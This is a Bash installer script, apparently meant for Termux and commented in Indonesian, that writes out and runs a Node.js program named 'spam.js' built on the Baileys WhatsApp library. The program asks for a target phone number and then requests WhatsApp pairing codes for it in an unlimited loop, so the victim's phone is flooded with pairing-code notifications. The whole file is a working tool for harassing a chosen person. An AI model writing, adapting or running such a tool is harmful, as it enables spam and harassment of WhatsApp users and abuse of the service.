#!/bin/bash

# Cek Node.js
if ! command -v node &> /dev/null; then
  pkg install -y nodejs -y
fi

mkdir -p $HOME/pairing-loop
cd $HOME/pairing-loop

# Buat package.json kalau belum ada
if [ ! -f "package.json" ]; then
cat <<EOF > package.json
{
  "name": "pairing-loop",
  "version": "1.0.0",
  "main": "spam.js",
  "type": "module",
  "dependencies": {
    "@whiskeysockets/baileys": "^6.7.1"
  }
}
EOF
fi

# Buat file spam.js otomatis
cat <<'EOF' > spam.js
import makeWASocket, { fetchLatestBaileysVersion, useMultiFileAuthState } from "@whiskeysockets/baileys"
import readline from "readline"
import fs from "fs"

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

function getRandomDelay(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

async function startLoop() {
  const { version } = await fetchLatestBaileysVersion()

  // Auth dummy pake MultiFileAuthState
  const authFolder = "./session_dummy"
  const { state, saveCreds } = await useMultiFileAuthState(authFolder)

  rl.question("MASUKAN NOMOR TARGET (62): ", async (number) => {
    console.log("════════════════════════════════════")
    console.log("     PAIRING CODE LOOP (UNLIMITED)")
    console.log("Ketik 'Q' lalu ENTER untuk berhenti")
    console.log("════════════════════════════════════")

    let stop = false
    let count = 0

    // Listener input untuk berhenti
    rl.on("line", (input) => {
      if (input.trim().toUpperCase() === "Q") {
        stop = true
        console.log("════════════════════════════════════")
        console.log(`Loop dihentikan oleh user (Q). Total code: ${count}`)
        console.log("════════════════════════════════════")
        rl.close()
        if (fs.existsSync(authFolder)) {
          fs.rmSync(authFolder, { recursive: true, force: true }) // hapus session dummy
        }
      }
    })

    while (!stop) {
      try {
        const sock = makeWASocket({
          version,
          auth: state,
          printQRInTerminal: false
        })

        sock.ev.on("creds.update", saveCreds)

        const code = await sock.requestPairingCode(number)
        count++
        console.log(`[${count}] Pairing Code: ${code}`)

        const delay = getRandomDelay(1000, 5000) // 1–5 detik
        console.log(`   → jeda ${delay / 1000} detik...`)
        await new Promise(r => setTimeout(r, delay))

      } catch (e) {
        console.log("Terjadi error:", e.message)
        break
      }
    }

    process.exit(0)
  })
}

startLoop()
EOF

# Install dependencies (sekali saja cukup)
npm install

# Jalankan loop pairing
node spam.js